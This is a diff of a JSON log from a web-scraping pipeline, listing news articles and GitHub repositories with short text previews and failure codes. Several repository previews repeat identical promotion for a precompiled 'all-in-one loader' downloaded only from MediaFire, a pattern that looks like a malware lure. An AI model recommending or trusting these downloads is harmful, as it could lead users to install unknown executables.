+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/news/1022626/patrick-stewart-star-trek-death",
+    "title": "Patrick Stewart has died at age 86",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2597,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Entertainment Posts from this topic will be added to your daily email digest and your homepage feed. See All Marvel Stewart was best known as Captain Jean-Luc Picard in Star Trek. Stewart was best known as",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/transportation/1022420/rivian-q3-earnings-r2-sales-volkswagen-software",
+    "title": "Rivian’s R2 is officially its best-selling vehicle",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Transportation Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Electric Cars The mass-market R2 has quickly become the company’s top seller by volume, but hig",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/ai-artificial-intelligence/1022519/google-gemini-file-editing-documents-pdfs",
+    "title": "You can generate and edit Google Docs files directly in Gemini chats now",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2337,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All AI Posts from this topic will be added to your daily email digest and your homepage feed. See All News Posts from this topic will be added to your daily email digest and your homepage feed. See All Tech Editing files you generate with Gemini no longer requires leaving the app.﻿ Editing files you generate",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://www.theverge.com/gadgets/1022440/ikea-varmblixt-smart-lamp-deal-sale",
+    "title": "Ikea&#8217;s colorful donut-shaped smart lamp is $20 off",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Posts from this topic will be added to your daily email digest and your homepage feed. See All Gadgets Posts from this topic will be added to your daily email digest and your homepage feed. See All Verge Shopping Posts from this topic will be added to your daily email digest and your homepage feed. See All Deals The Varmblixt can display hundreds of colors thanks to its Matter support, and can be ",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://arstechnica.com/gadgets/2026/10/google-admits-ai-search-makes-less-money-but-its-fixing-that-with-more-ads/",
+    "title": "Google admits AI search makes less money, but it's fixing that with more ads",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Google’s negative cash flow balloons to -$9.06 billion, and stock price tumbles following Q3 earnings. Google parent Alphabet reported its Q3 financial results on Wednesday afternoon, showing a healthy rise in revenue for the months of July to September. But the company’s stock price has taken a beating, marking one of the largest post-earnings drops in its history. It comes down to several troubl",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://openai.com/index/how-we-detect-frontier-model-misalignment",
+    "title": "How we detect frontier model misalignment",
+    "outcome": "skipped_no_content",
+    "stage0": {
+      "scraped_chars": 0,
+      "source_preview": "",
+      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/how-we-detect-frontier-model-misalignment"
+    }
+  },
+  {
+    "url": "https://openai.com/index/ropes-gray-ai-diligence",
+    "title": "How Ropes & Gray is developing AI for transactional diligence",
+    "outcome": "skipped_no_content",
+    "stage0": {
+      "scraped_chars": 0,
+      "source_preview": "",
+      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/ropes-gray-ai-diligence"
     }
   },
   {
@@ -526,32 +573,39 @@
     }
   },
   {
-    "url": "https://openai.com/index/building-scientific-understanding-with-academic-communities",
-    "title": "Working with academic communities to build scientific understanding",
-    "outcome": "skipped_no_content",
+    "url": "https://github.com/jackwener/DeepseekHarness-Android",
+    "title": "jackwener/DeepseekHarness-Android",
+    "outcome": "stage2_failed",
     "stage0": {
-      "scraped_chars": 0,
-      "source_preview": "",
-      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/building-scientific-understanding-with-academic-communities"
-    }
+      "scraped_chars": 772,
+      "source_preview": "免 ROOT 免 Termux，一个 APK 在安卓手机上跑 DeepSeek Harness。引擎内嵌 App 进程 · 读屏操作 App · 改系统设置 · 定时/条件自动化 · 可选 Shizuku 在安卓手机上运行 DeepSeek Harness （dsh）：用一句话让它整理文件、操作 App、修改系统设置，或者设置自动执行的任务。 下载 APK • 快速开始 • 架构 • 从源码构建 Android 10 及以上，arm64-v8a；安装包约 110 MB，建议预留 500 MB 可用空间；需要能访问 DeepSeek API。 DSH-Android 不在 Google Play 上分发，又用到了无障碍、通知读取、短信等能力，Google Play 保护机制可能把它误判为有害应用。核对过下载的 APK 和发布说明里的 SHA-256 一致后，可以这样安装： 需要 JDK 21",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "no",
+      "translated_to_english": true
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://openai.com/index/chatgpt-expanding-world-of-work",
-    "title": "ChatGPT’s expanding world of work",
-    "outcome": "skipped_no_content",
-    "stage0": {
-      "scraped_chars": 0,
-      "source_preview": "",
-      "scrape_error": "403 Client Error: Forbidden for url: https://openai.com/index/chatgpt-expanding-world-of-work"
-    }
-  },
-  {
-    "url": "https://github.com/jmanico/grim-prompter",
-    "title": "jmanico/grim-prompter",
+    "url": "https://github.com/wangzan101/Mika",
+    "title": "wangzan101/Mika",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Threat modeling for AI coding agents: point Claude Code, Codex or any agent at your repo and get an evidence-traced threat model. 36 architectures, 29 methods, MIT. Threat modeling for AI coding agents. Point Claude Code, Codex or any coding agent at your repo. Get a threat model traced to your code. Threat model your project with Claude Code, Codex, or another coding agent. Grim Prompter provides",
+      "source_preview": "Mika — 你手机上的私人 AI 助理，替你操作 App、上网、把事办成。An on-device AI agent for Android that operates apps and the web to get things done for you. 你手机上的私人 AI 助理，替你操作 App、上网、把事办成。 它在一块看不见的后台屏上干活，你照样刷你的手机。 An on-device AI agent for Android that operates apps and the web to get things done for you — on a hidden background screen, so you can keep using your phone. 下载 APK · 快速开始 · 能做什么 · 常见问题 · 参与贡献 简体中文 | English Eng",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -573,12 +627,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/davemessew/AgentFlux",
-    "title": "davemessew/AgentFlux",
+    "url": "https://github.com/w0ldan/exoproc",
+    "title": "w0ldan/exoproc",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Agentic AI platform for visual workflows and autonomous agents. Run it with Docker on your own computer or server. Agentic AI platform for visual workflows and autonomous agents. Import files, automate tasks and keep results local. Download the Docker release · Website · Documentation · Report an issue AgentFlux connects documents, data sources and language models in a visual workflow. Build each ",
+      "source_preview": "TypeScript toolkit for Windows x64 native systems programming, memory manipulation, and process instrumentation. Inspect a running process. Intercept functions, redirect threads, modify memory, and compile C to shellcode—without DLL injection. Quick start · How Exoproc works · What you can inspect & instrument · Showcases · MCP tool catalog · CLI reference · FAQ · Architecture Important Exoproc ta",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -600,12 +654,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/Speedrunlab/reverse-engineer-anything-self-learning-loop",
-    "title": "Speedrunlab/reverse-engineer-anything-self-learning-loop",
+    "url": "https://github.com/yjid/kensaku",
+    "title": "yjid/kensaku",
     "outcome": "stage2_failed",
     "stage0": {
       "scraped_chars": 3000,
-      "source_preview": "Agent skill: examine a product you're authorised to rebuild, build your own, then test against the original and fix gaps until every must-have on a written checklist passes. Inspired by REA ( @morluto ), not affiliated. MIT. Reverse Engineer Anything with a Self-Learning Loop: examine a product you are authorised to rebuild, build your own version, and keep improving it until every must-have on a ",
+      "source_preview": "Search inside documents, code, and even screenshots - instantly and locally. A free, open-source file launcher with OCR, semantic search, and MCP agent access. Fast, light, and efficient. Find anything on your computer. Search 100,000 file names in about a millisecond, using roughly 12 MB of memory. Search inside documents, images, and code too. Nothing leaves your machine. Install · Why Kensaku ·",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -627,12 +681,12 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/Shaitrish/37studio",
-    "title": "Shaitrish/37studio",
+    "url": "https://github.com/sirioberati/YouTube-AI-Motion-Graphics",
+    "title": "sirioberati/YouTube-AI-Motion-Graphics",
     "outcome": "stage2_failed",
     "stage0": {
-      "scraped_chars": 3000,
-      "source_preview": "Open-source AI alternative to Buffer and Opus Clip: Claude Code makes on-brand videos, posts them to 9 platforms and drafts replies. Self-hosted, your own keys. An AI video studio and social media desk that runs on your own computer. Videos made, posted and answered, with your own keys and no monthly bill. ▶ Watch the 2-minute intro (English · বাংলা) · Setup guide · Changelog · Issues · Donate 37S",
+      "scraped_chars": 2712,
+      "source_preview": "AI motion graphics for YouTube explainer videos: 74 animated HTML explainer boards (charts, diagrams, Venn, timeline, heatmap) synced to your voice with Whisper, exported frame by frame with Chrome + FFmpeg. Every prompt + Claude skills. By TEIN AI. 12 of the 74 boards. See them all ↓ 74 animated explainer boards for YouTube videos that sync to your voice. Made with Claude Design and Claude Code. ",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "en",
@@ -654,16 +708,178 @@
     "entity_context_preview": "No additional context available."
   },
   {
-    "url": "https://github.com/harrytted/ai-agent-interview-playbook",
-    "title": "harrytted/ai-agent-interview-playbook",
+    "url": "https://github.com/papisoV/Selenequant",
+    "title": "papisoV/Selenequant",
     "outcome": "stage2_failed",
     "stage0": {
-      "scraped_chars": 1701,
-      "source_preview": "AI Agent／大模型应用工程师中文学习手册：10 章基础、12 章进阶、92 道完整详解题、276 组追问与答案、92 个实战案例，含双向学习链接、Python 实验与复习工具。用场景和易记类比理解机制，用故障与评测练习工程取舍。 Agent 能把答案说得很像已经办成了。学这份手册，要再往前走一步：看清它读了什么、做了什么，失败后还能不能收拾现场。 面向 AI Agent / 大模型应用工程师 ，以 Python 实践为主。仓库包含 10 章基础、12 章进阶、92 道原创详解题 ，配有数值算例、执行器与恢复实验、项目工作坊、学习路线和模拟面试。 全部题目都有口述短答、详细答案、3 个带回答的追问、实战案例、误区与验收练习，共 276 组追问、92 个案例 。每题直接链接对应学习内容，章节末尾也能找到相关题目。 可以从一个具体问题开始：为什么引用存在却不支持结论？为什么超时之后反而创建",
+      "scraped_chars": 3000,
+      "source_preview": "A local-first AI quant research platform: questions are persistent, conclusions are versioned, and prior findings are recalled into the next call. Python + Next.js, AGPL-3.0-only. Most research tools store answers. SeleneQuant keeps the question , runs real experiments against it, versions every conclusion, and recalls what was already established when the next question arrives. That loop is run b",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/PeaceOfElf37336/resilient-telegram-rpocket-bot",
+    "title": "PeaceOfElf37336/resilient-telegram-rpocket-bot",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "A Telegram bot built around what happens when the API doesn't answer — retry with jittered backoff, structured logging, systemd deployment. Runs with --demo, no token needed. ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribution Notice We distribute our software on",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/Honorshogun/mimiga-ai-bot-resp",
+    "title": "Honorshogun/mimiga-ai-bot-resp",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 971,
+      "source_preview": "🐿️ Интерактивный AI Telegram-бот на Python (DeepSeek API, RAG Web Search, PostgreSQL) со встроенным набором Smoke QA автотестов ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribution Notice We distribute our software only through MediaFire . If the download link lea",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/peterpoal134/memory-brain",
+    "title": "peterpoal134/memory-brain",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 506,
+      "source_preview": "给 AstrBot 的可落地 AI 记忆与生活层：五类记忆、混合检索、遗忘治理、情绪边界、自主生活循环。不覆盖人格。 给聊天机器人一套能长期跑的记忆、情绪、表达和生活层。 不是新算法，是一套可落地的工程整合。 普通机器人聊完就忘。这里做了五件事： 这是硬约束： 把 plugins/ 下四个目录放进 AstrBot/data/plugins/ ，重启。 依赖： embedding 自己配：默认读插件配置里的 embedding_provider_id ，没配就退化为关键词检索。 不配任何环境变量也能跑，只是不刷手机、不发消息。 结论： 存储不是瓶颈，保留策略才是。 十年不用换硬件，想记更久就关掉 180 天清理。 仓库带了一份示例评估集和脚本： 我们在 40 条中文真实问法上的结果（仅供参考，和模型、数据强相关）： 只依赖标准库 + numpy，不需要 AstrBot。 AGPL-3.0-o",
       "scrape_error": null,
       "used_summary_fallback": false,
       "detected_language": "zh-cn",
       "translated_to_english": true
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/Gnome58288Monk/rpocket-chronos",
+    "title": "Gnome58288Monk/rpocket-chronos",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 3000,
+      "source_preview": "Autonomous, modular Multi-Agent Operating System built in Python with a Human-In-The-Loop Telegram Command Center. ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribution Notice We distribute our software only through MediaFire . If the download link leads to any oth",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/TrollSparktech/Anilist_monitor_resp",
+    "title": "TrollSparktech/Anilist_monitor_resp",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2463,
+      "source_preview": "A desktop-native Windows system tray Telegram bot that monitors AniList for new anime announcements and releases with network auto-recovery, single-instance protection, and zero-spam baseline caching. Made with AI. ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribut",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
+    },
+    "stage1": {},
+    "cache": {
+      "hits": [],
+      "misses": []
+    },
+    "search": {
+      "backend": "ddg",
+      "identity_queries": [],
+      "context_queries": [],
+      "context_queries_with_gap1_attached": [],
+      "results": {}
+    },
+    "cache_updates": [],
+    "entity_context_preview": "No additional context available."
+  },
+  {
+    "url": "https://github.com/Novaemperor98577/tasking-resp",
+    "title": "Novaemperor98577/tasking-resp",
+    "outcome": "stage2_failed",
+    "stage0": {
+      "scraped_chars": 2386,
+      "source_preview": "Conversational task manager for teams — Telegram + AI agent + PostgreSQL. Assign, track, and get reminded about tasks in natural language, with role-based manager visibility. ⚡ All-in-one loader: The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required. ⚠️ Important: Official Distribution Notice We distribute our software on",
+      "scrape_error": null,
+      "used_summary_fallback": false,
+      "detected_language": "en",
+      "translated_to_english": false
     },
     "stage1": {},
     "cache": {
